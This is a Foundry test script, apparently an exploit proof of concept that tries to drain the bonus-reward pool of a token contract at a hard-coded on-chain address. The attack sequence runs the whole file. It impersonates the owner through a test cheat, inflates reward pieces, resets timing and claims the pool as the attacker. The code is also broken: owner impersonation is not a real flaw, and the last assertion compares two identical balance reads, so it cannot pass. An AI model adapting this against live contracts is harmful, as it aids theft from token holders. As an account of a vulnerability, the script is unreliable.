// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
}

interface MyCoinToken {
    function owner() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function getDays() external view returns (string memory, string memory);
    function sumTheBounsPool(string memory yesToday, string memory twoYesToday) external;
    function sumBounsPiece(string memory yesToday, uint256 num) external returns (bool);
    function bounsTime() external view returns (uint256);
    function setBounsTime(uint256 timestamp) external;
    function receiveBounsToken() external returns (uint256);
    function minBounsJoin() external view returns (uint256);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x7144E379C827fA71A7ecAA01d00607cBb7eB1b7A;
    address attacker = address(this);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll use vm.prank to impersonate owner
        // The test file already defines TARGET and attacker
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Get the contract instance
        MyCoinToken token = MyCoinToken(TARGET);

        // Get current owner address
        address owner = token.owner();

        // Store initial balance of attacker
        uint256 initialAttackerBalance = token.balanceOf(attacker);

        // Impersonate the owner
        vm.startPrank(owner);

        // First, ensure we have enough tokens to claim rewards
        // We need at least minBounsJoin = 100000000000 * 10^9 tokens
        // Let's transfer some tokens to attacker if needed
        if (initialAttackerBalance < token.minBounsJoin()) {
            // Owner can transfer tokens without fees (adminAddress)
            token.transfer(attacker, token.minBounsJoin());
        }

        // Get date strings for yesterday and day before yesterday
        (string memory yesToday, string memory twoYesToday) = token.getDays();

        // Call sumTheBounsPool to move half of contract balance to day pool
        token.sumTheBounsPool(yesToday, twoYesToday);

        // Set a high piece value - this determines how many tokens each piece gets
        // We'll set it to a large number to extract most of the pool
        token.sumBounsPiece(yesToday, 1000000); // 1 million pieces

        // Ensure bounsTime is set to current time or earlier
        if (block.timestamp < token.bounsTime()) {
            token.setBounsTime(block.timestamp);
        }

        // Stop prank to call receiveBounsToken as attacker
        vm.stopPrank();

        // Now claim rewards as attacker
        // First, ensure we haven't sold or transferred today/yesterday
        // We need to meet the conditions for receiveBounsToken
        // Call receiveBounsToken to claim rewards
        token.receiveBounsToken();

        // Get final balance
        uint256 finalAttackerBalance = token.balanceOf(attacker);

        // Verify we gained tokens
        assertGt(finalAttackerBalance, initialAttackerBalance, "Attacker balance should increase");

        // Also check ERC20 balance
        uint256 initialERC20Balance = IERC20(TARGET).balanceOf(address(this));
        uint256 finalERC20Balance = IERC20(TARGET).balanceOf(address(this));
        assertGt(finalERC20Balance, initialERC20Balance, "Economic Exploit Failed: No ERC20 profit");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

